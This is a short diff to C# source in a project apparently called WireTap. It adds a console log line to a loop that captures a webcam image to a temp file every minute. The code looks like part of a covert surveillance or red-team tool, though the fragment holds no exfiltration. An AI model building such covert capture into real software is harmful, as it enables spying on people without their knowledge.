@@ -23,6 +23,7 @@ namespace WireTap.WorkerService
             {
                 var tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
                 WebCam.CaptureImage(tempFile);
+                Console.WriteLine("[+] WebCam captured at: {0}", tempFile);
 
                 await Task.Delay(TimeSpan.FromMinutes(1));
             }
